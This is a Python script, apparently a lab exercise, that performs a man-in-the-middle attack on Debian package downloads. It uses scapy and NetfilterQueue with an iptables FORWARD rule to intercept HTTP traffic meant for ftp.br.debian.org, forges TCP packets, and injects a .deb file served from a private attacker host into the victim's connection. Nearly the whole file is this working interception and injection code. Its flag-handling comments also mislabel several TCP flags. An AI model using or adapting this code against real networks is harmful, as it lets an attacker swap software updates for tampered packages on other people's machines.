import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR, send, Raw
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import TCP
import http.client
import re

enviou = 0

class DnsSnoof:
    def __init__(self, hostDict, queueNum, enviou):
        self.enviou = enviou
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Snoofing....")
        os.system( f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system( f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(TCP) and scapyPacket[TCP].dport == 80:
            log.info(f'[HTTP Packet] {scapyPacket.summary()}')

            # Modificar o corpo da resposta HTTP
            http_payload = scapyPacket[TCP].payload

            # Verificar o pacote FIN (finalização de conexão)
            if scapyPacket[TCP].flags == 1:
                log.info(f'[TCP FIN] {scapyPacket.summary()}')

            # Verificar o pacote SYN (solicitação de conexão)
            elif scapyPacket[TCP].flags == 2:
                log.info(f'[TCP SYN] {scapyPacket.summary()}')

                # Construir pacote de resposta SYN/ACK
                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                        TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                            flags="SA", seq=12345, ack=scapyPacket[TCP].seq + 1)

                # Enviar pacote de resposta
                send(response_packet, verbose=0)
                log.info(f'[TCP SYN/ACK Response] {response_packet.summary()}')

            elif scapyPacket[TCP].flags == 4:  # RST
                log.info(f'[TCP RST] {scapyPacket.summary()}')

            elif scapyPacket[TCP].flags == 8:  # PSH
                log.info(f'[TCP PSH] {scapyPacket.summary()}')                                          
            elif scapyPacket[TCP].flags == 16:  # ACK
                log.info(f'[TCP ACK] {scapyPacket.summary()}')

            # Verifica pacote FIN-ACK (flag "FA")
            elif scapyPacket[TCP].flags == 17:
                log.info(f'[TCP FIN-ACK] {scapyPacket.summary()}')

                # Construir pacote de resposta ACK
                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                    TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                        flags="FA", seq=scapyPacket[TCP].ack, ack=scapyPacket[TCP].seq + 1)

                # Enviar pacote de resposta
                send(response_packet, verbose=0)

                log.info(f'[TCP ACK Response] {response_packet.summary()}')

            # Verifica se é uma resposta HTTP (flags ACK + PSH)
            elif scapyPacket[TCP].flags == 18:
                log.info(f'[TCP SYN/ACK] {scapyPacket.summary()}')

                # Ler o conteúdo do arquivo .deb
                with open('./debian/pool/main/g/gnome-calculator/gnome-calculator_43.0.1-2_amd64.deb', 'rb') as file:
                    deb_content = file.read()

                # Construir pacote de resposta com o conteúdo do arquivo .deb como payload
                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                    TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                        flags="PA", seq=12345, ack=scapyPacket[TCP].seq + 1) / \
                                    Raw(load=deb_content)

                # Enviar pacote de resposta
                send(response_packet, verbose=0)
                log.info(f'[TCP SYN/ACK Response with .deb File] {response_packet.summary()}')

            elif scapyPacket[TCP].flags == 24:  # PA (Push-Ack)
                log.info(f'[TCP PA] {scapyPacket.summary()}')

                if self.enviou == 1:
                    # Envia outro pacote
                    response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                        TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                            flags="FA", seq=scapyPacket[TCP].ack, ack=scapyPacket[TCP].seq + 1)

                    send(response_packet, verbose=0)
                    log.info(f'[TCP FIN Response] {response_packet.summary()}')
                    exit(1)
                    return packet.accept()

                conn = http.client.HTTPConnection("172.19.0.127", 80)

                # Expressões regulares para separar a string
                path_pattern = r"^(.*?)\sHTTP/"
                headers_pattern = r"\s(.*?):\s(.*?)\r\n"

                # Extrair path e headers usando expressões regulares
                path = '/debian/pool/main/g/gnome-calculator/gnome-calculator_43.0.1-2_amd64.deb'
                headers_matches = re.findall(headers_pattern, scapyPacket.load.decode('utf-8'))

                # Criar dicionário para headers
                headers = {key: value for key, value in headers_matches}

                # Adicionar 'Host' aos headers
                host = headers.pop('Host', None)
                headers['Host'] = '172.19.0.127'
                headers['Accept'] = '*/*'
                headers['Content-Length'] = os.path.getsize(f'.{path}')

                # Formatar os resultados
                formatted_path = f"path = '{path}'"
                formatted_headers = "{\n"
                for key, value in headers.items():
                    formatted_headers += f"    '{key}': '{value}',\n"
                formatted_headers += "}"
                print(f'\n{path}\n')
                conn.request("GET", path, headers=headers)

                response = conn.getresponse()

                # Fecha a conexão
                conn.close()

                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                    TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                        flags="PA", seq=scapyPacket[TCP].ack, ack=scapyPacket[TCP].seq + 1) / \
                                    Raw(load=response.read())

                send(response_packet, verbose=0)
                log.info(f'[TCP ACK Response] {response_packet.summary()}')

                self.enviou = 1

            elif scapyPacket[TCP].flags == 32:  # URG
                log.info(f'[TCP URG] {scapyPacket.summary()}')

            else:
                log.info(f'[TCP Flag Unknown] {scapyPacket.summary()}')

        return packet.accept()


if __name__ == '__main__':
    try:
        hostDict = {
                b"ftp.br.debian.org": "172.19.0.127",
                }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s',
                        level = log.INFO)
        snoof = DnsSnoof(hostDict, queueNum, enviou)
        snoof()
    except OSError as error:
        log.error(error)
